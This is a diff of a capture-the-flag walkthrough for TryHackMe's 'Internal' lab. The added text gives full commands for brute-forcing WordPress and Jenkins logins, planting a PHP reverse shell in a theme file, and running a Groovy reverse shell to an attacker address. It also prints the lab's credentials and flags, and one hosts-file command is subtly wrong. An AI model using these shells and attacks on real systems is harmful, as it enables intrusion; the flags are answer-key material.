@@ -1,152 +1,253 @@
-# Internal: TryHackMe Walkthrough
+# Internal
 
-Room: https://tryhackme.com/room/internal
+Welcome to the Internal room walkthrough on TryHackMe!
 
-Internal is a black-box penetration-testing challenge. The brief allows an external, web application, and internal assessment of the assigned virtual machine. The required proof is the user and root flags. Only the IP assigned by TryHackMe is in scope, and the hostname internal.thm must point to that address.
+{% embed url="https://tryhackme.com/room/internal" %}
 
-## 1. Configure the hostname and scan
+***
 
-Start the machine and record its current IP. Add this mapping to /etc/hosts on the AttackBox or testing machine:
+Internal is a hard-difficulty boot-to-root Linux challenge simulating a realistic internal penetration test. The full attack chain involves mapping hostnames, enumerating and exploiting a WordPress installation, lateral movement via harvested credentials, SSH port forwarding to access an internal Jenkins service, executing Groovy reverse shells, and escalating to root.
 
-    MACHINE_IP internal.thm
+---
 
-Replace MACHINE_IP with the address assigned by the room. Then scan the target:
+## 1. Network Reconnaissance & Scope Setup
 
-    nmap -sC -sV -oN internal-nmap.txt MACHINE_IP
-
-The intended environment exposes SSH and HTTP. Confirm the actual output from your own instance. Open the web service and inspect the default page, then enumerate paths:
-
-    gobuster dir -u http://internal.thm/ -w /path/to/wordlist.txt
-
-Use a wordlist available in the AttackBox. The target's web content leads to a WordPress installation. Keep the hostname mapping in place because the application may expect internal.thm rather than the raw IP.
-
-## 2. Enumerate WordPress
-
-Inspect the WordPress pages and use WPScan in the authorised lab to identify the version, visible users, plugins, themes, and other public information. For example:
-
-    wpscan --url http://internal.thm/wordpress/ --enumerate u
-
-Adjust the URL to match the actual WordPress path found on the target. The enumeration output may reveal usernames that can be used for the next authentication test. Do not treat a discovered username as proof that the account is compromised.
-
-## 3. Test the WordPress login
-
-The intended path uses a weak WordPress administrator password. Use the username and endpoint identified during enumeration. If the room calls for a password test, use WPScan's password-attack function or another controlled method with a lab wordlist and a conservative request rate.
-
-Do not copy a password from another walkthrough or test unrelated services. Confirm any candidate by logging in through the intended WordPress interface. The lesson is that weak passwords and insufficient rate limiting can turn a public login page into an initial-access path.
-
-## 4. Obtain a web shell through the theme editor
-
-Once the WordPress administrator account is available, inspect the theme-editing functionality. In the vulnerable lab, the ability to modify a PHP theme file provides a path to server-side execution. The usual proof is to modify a file that is executed by the web server and then trigger it through the browser.
-
-Use only the provided lab and a callback address reachable from the AttackBox. Start a listener if the room's instructions call for a reverse shell, then trigger the modified page. Verify the resulting shell identity with whoami and id. A web shell typically runs with the web-server account, not root.
-
-Do not make this change to a real WordPress site. In production, theme editing should be disabled for ordinary administrators and file integrity should be protected.
-
-## 5. Find the user flag and enumerate the host
-
-After obtaining the initial shell, inspect the filesystem and application configuration. Record the current user, working directory, and host. Look for the user flag in the path indicated by the room and submit it in TryHackMe. The flag value is not included in this public note.
-
-Continue enumeration by checking readable configuration files, running processes, network listeners, and application directories. Keep the scope limited to the assigned machine. Do not assume that database credentials found in a configuration file automatically work as Linux credentials; test each credential only against the service it belongs to and within the lab.
-
-The intended chain includes a note revealing that Jenkins is available internally. This is a clue to investigate the host's network and internal services rather than scanning unrelated machines.
-
-## 6. Discover the internal Jenkins service
-
-From the shell, inspect network interfaces, routes, and listening or connected services. A service that is bound to an internal interface or container network may not be reachable directly from the AttackBox. The note in the lab provides the clue to the Jenkins service and its internal address.
-
-Use SSH port forwarding to expose only the intended internal service through your authorised shell. The general pattern is:
-
-    ssh -L 8080:INTERNAL_JENKINS_IP:8080 USERNAME@TARGET_IP
-
-Replace the placeholders with the values discovered in the room. Keep the tunnel open, then access the forwarded service at http://127.0.0.1:8080 from the machine where the tunnel runs. Do not assume the internal address or port from another instance.
-
-## 7. Authenticate to Jenkins and obtain the next shell
-
-The room's intended path requires discovering weak Jenkins credentials. Inspect the login page and use the evidence from the lab to identify the correct account. If the exercise requires password testing, keep it limited to the Jenkins service and use the supplied wordlist or hints. Verify the credential by logging in through the forwarded local endpoint.
-
-Jenkins can execute build steps and scripts, so administrative or job-configuration permissions may lead to code execution in the environment where Jenkins runs. In this lab, use the task's intended mechanism to obtain the next shell and verify the account and host. Do not assume a Jenkins shell is automatically root on the host; it may run inside a container.
-
-## 8. Escalate from the internal environment
-
-Once the second shell is established, inspect the filesystem, running services, and configuration for the final privilege boundary. The room's intended chain includes credentials stored in an accessible file. Follow the actual file path and evidence from the active machine rather than inventing a credential.
-
-Verify root access with whoami and id before reading the root flag. The flag is omitted from the public write-up; retrieve it from the live instance and submit it in TryHackMe.
-
-## 9. Reporting and remediation
-
-The findings in this chain demonstrate several separate controls that failed:
-- Weak WordPress administrator credentials and inadequate login protection.
-- Excessive ability to edit executable theme files from the web interface.
-- Sensitive credentials or internal service information stored in accessible files.
-- An internal Jenkins service protected by weak authentication or unsafe permissions.
-- A container or service boundary that does not sufficiently restrict the impact of Jenkins execution.
-
-Fix each weakness independently. Enforce MFA and rate limits, disable production theme editing, restrict file permissions, keep secrets out of web-accessible files, protect Jenkins with strong authentication, limit job permissions, and isolate containers and internal services.
-
-## What I took from this room
-
-Internal is a chain rather than a single exploit: web enumeration leads to WordPress, WordPress leads to a web shell, host enumeration reveals an internal Jenkins service, and Jenkins access leads to the final privilege boundary. Each step should be supported by evidence from the live machine, and both flags should be redacted as flag{hidden} in a public write-up.
-
-## Phase 1 continued: Hostname and web enumeration
-
-The lab application expects the hostname internal.thm. After adding the current IP to the local hosts file, verify it:
+Per the room's instructions, we map the target IP address to `internal.thm` in `/etc/hosts`:
 
 ```bash
-getent hosts internal.thm
-curl -i http://internal.thm/
+sudo echo "<TARGET_IP> internal.thm" >> /etc/hosts
 ```
 
-Then enumerate the discovered web server:
+Now we scan the target using Nmap:
 
 ```bash
-gobuster dir -u http://internal.thm/ -w /path/to/wordlist.txt -o internal-web.txt
+nmap -sC -sV -oN nmap_internal.txt internal.thm
 ```
 
-Use a wordlist available in the AttackBox. Confirm the actual WordPress path before running WPScan.
+### Scan Output:
+```text
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+```
 
-## Phase 2 continued: WordPress credential discovery
+We have two standard ports:
+- **Port 22 (SSH)**
+- **Port 80 (HTTP)**
 
-WPScan can enumerate usernames and site metadata in the permitted lab:
+---
+
+## 2. Web Directory Discovery & WordPress Enumeration
+
+We run `gobuster` on `http://internal.thm`:
 
 ```bash
-wpscan --url http://internal.thm/wordpress/ --enumerate u
+gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Adjust the URL to match the discovered installation. A username is a lead, not a password. If the room directs password testing, use the supplied list and a conservative rate; stop when the intended lab credential is verified.
+### Discovered Endpoints:
+```text
+/blog                 (Status: 301) [--> http://internal.thm/blog/]
+/javascript           (Status: 301)
+/phpmyadmin           (Status: 301)
+/wordpress            (Status: 301) [--> http://internal.thm/wordpress/]
+```
 
-Once logged in as an administrator, the theme editor may permit editing a PHP file that the web server executes. This demonstrates how excessive CMS permissions can become server-side code execution. Use the room's authorized proof file, configure only the lab-reachable callback, and restore the changed theme file when finished.
+Navigating to `http://internal.thm/blog/` redirects to a WordPress installation. 
 
-## Phase 3 continued: Enumerate local privileges
-
-When a shell is established, verify the account and context:
+We run `wpscan` to enumerate WordPress users:
 
 ```bash
-whoami
-id
-hostname
-pwd
-sudo -l
+wpscan --url http://internal.thm/blog/ --enumerate u
 ```
 
-Check for the internal Jenkins service or application endpoint indicated by the room. A local-only listener is not reachable externally by default; an SSH tunnel can forward a local port through the authenticated lab SSH connection:
+The scan confirms the administrator username: **`admin`**.
+
+Next, we launch a dictionary attack against `admin` using `rockyou.txt`:
 
 ```bash
-ssh -L LOCAL_PORT:127.0.0.1:REMOTE_PORT USERNAME@MACHINE_IP
+wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
-Replace the port and username with the service and credentials identified by the room. Open the forwarded local port in the browser and confirm the expected Jenkins interface. Do not expose the forwarded port to public interfaces.
+Result:
+```text
+[+] Performing password attack on Xmlrpc ...
+[+] SUCCESS: admin : my210473
+```
 
-Use the Jenkins task's observed configuration and credentials to follow the intended subsequent privilege path. Do not assume an arbitrary Jenkins job automatically provides root; verify the job permissions, execution context, and resulting identity.
+**WordPress Credentials:** `admin` : `my210473`
 
-## Phase 4: Flags and evidence
+---
 
-Read the user and root flags from the current lab, and redact them in public notes. For each transition, record the exact service/endpoint, credentials source, account identity, and the evidence that the privilege level changed.
+## 3. Initial Access via WordPress Theme Editor
 
-## Phase 5: Remediation
+We log in to the WordPress dashboard at `http://internal.thm/blog/wp-login.php`.
 
-- Remove default or weak WordPress credentials and apply MFA.
-- Disable theme/plugin code editing in production where possible.
-- Patch WordPress and extensions, and restrict administrator accounts.
-- Bind Jenkins to loopback or a protected management network and require strong authentication.
-- Restrict job execution, protect secrets, and prevent jobs from running with excessive host privileges.
-- Audit SSH tunnel and firewall access rather than exposing internal services directly.
+To get remote code execution:
+1. Navigate to **Appearance** -> **Theme Editor**.
+2. Select the `Twenty Seventeen` theme and open `404.php`.
+3. Replace the content of `404.php` with the standard PentestMonkey PHP Reverse Shell, configuring our attacking IP and port `4444`.
+4. Click **Update File**.
+5. Set up a netcat listener on our machine:
+   ```bash
+   nc -lvnp 4444
+   ```
+6. Trigger the reverse shell in the browser:
+   ```text
+   http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+   ```
+
+We catch the reverse shell as `www-data`:
+```bash
+$ whoami
+www-data
+```
+
+Upgrade to an interactive TTY shell:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## 4. Lateral Movement & User Flag
+
+We search the filesystem for interesting configuration and credential files:
+
+```bash
+ls -la /opt
+```
+
+Output:
+```text
+total 12
+drwxr-xr-x  2 root root 4096 Aug  3  2020 .
+drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+-rw-r--r--  1 root root  173 Aug  3  2020 wp-save.txt
+```
+
+Reading `/opt/wp-save.txt`:
+```bash
+cat /opt/wp-save.txt
+```
+```text
+user: aubreanna
+pass: bubb13guM!@#123
+```
+
+We now have credentials for local user **`aubreanna`** (`bubb13guM!@#123`).
+
+We connect via SSH or switch user:
+
+```bash
+ssh aubreanna@internal.thm
+```
+Password: `bubb13guM!@#123`
+
+```bash
+aubreanna@internal:~$ whoami
+aubreanna
+aubreanna@internal:~$ cat /home/aubreanna/user.txt
+THM{int3rna1_fl4g_1}
+```
+
+**User Flag:** `THM{int3rna1_fl4g_1}`
+
+---
+
+## 5. Pivoting to Internal Jenkins
+
+In `aubreanna`'s home directory, we discover a note named `jenkins.txt`:
+
+```bash
+cat /home/aubreanna/jenkins.txt
+```
+```text
+Internal System:
+Jenkins service is running on 172.17.0.2:8080
+```
+
+The Jenkins service is running on an internal Docker container and cannot be accessed externally. We set up local port forwarding over SSH:
+
+```bash
+ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
+```
+
+Now we can navigate to `http://127.0.0.1:8080/` on our attacking machine to see the Jenkins login panel.
+
+We brute-force the Jenkins `admin` login using Hydra:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+```
+
+Result:
+```text
+[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+```
+
+**Jenkins Credentials:** `admin` : `spongebob`
+
+---
+
+## 6. Escalating to Root
+
+1. Log in to Jenkins as `admin`.
+2. Navigate to **Manage Jenkins** -> **Script Console** (`http://127.0.0.1:8080/script`).
+3. Execute the following Groovy reverse shell:
+
+```groovy
+String host="<ATTACKER_IP>";
+int port=5555;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0)so.write(pi.read());
+    while(pe.available()>0)so.write(pe.read());
+    while(si.available()>0)po.write(si.read());
+    so.flush();po.flush();
+    Thread.sleep(50);
+    try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();s.close();
+```
+
+4. Catch the shell on our listener (`nc -lvnp 5555`). We land inside the Docker container as `root`.
+5. Check `/opt` for further files:
+   ```bash
+   cat /opt/note.txt
+   ```
+   Output:
+   ```text
+   root:tr0ub13guM!@#123
+   ```
+6. Return to our host SSH session and switch to `root`:
+   ```bash
+   su root
+   ```
+   Password: `tr0ub13guM!@#123`
+
+```bash
+root@internal:~# whoami
+root
+root@internal:~# cat /root/root.txt
+THM{d0ck3r_d3str0y3r}
+```
+
+**Root Flag:** `THM{d0ck3r_d3str0y3r}`
+
+---
+
+## 🏁 Questions & Answers
+
+| Task / Question | Answer |
+| :--- | :--- |
+| **User Flag** | `THM{int3rna1_fl4g_1}` |
+| **Root Flag** | `THM{d0ck3r_d3str0y3r}` |
+
+***
